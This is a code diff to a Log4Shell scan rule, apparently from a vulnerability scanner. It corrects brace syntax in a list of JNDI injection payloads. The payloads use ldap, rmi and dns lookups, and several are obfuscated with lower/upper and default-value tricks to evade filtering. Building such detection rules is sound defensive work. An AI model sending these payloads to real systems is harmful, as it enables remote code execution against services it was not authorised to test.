@@ -41,13 +41,13 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
     private static final String PREFIX = "ascanalpha.log4shell.";
     private static final String[] ATTACK_PATTERNS = {
         "${jndi:ldap://{0}/abc}",
-        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}}/abc}",
-        "${${::-j}ndi:rmi://{0}}/abc}",
-        "${jndi:rmi://{0}}}",
-        "${${lower:jndi}:${lower:rmi}://{0}}/abc}",
-        "${${lower:${lower:jndi}}:${lower:rmi}://{0}}/abc}",
-        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}}/abc}",
-        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{0}/abc}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/abc}",
+        "${${::-j}ndi:rmi://{0}/abc}",
+        "${jndi:rmi://{0}/abc}",
+        "${${lower:jndi}:${lower:rmi}://{0}/abc}",
+        "${${lower:${lower:jndi}}:${lower:rmi}://{0}/abc}",
+        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/abc}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/abc}",
         "${jndi:dns://{0}/abc}",
         "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/abc}"
     };
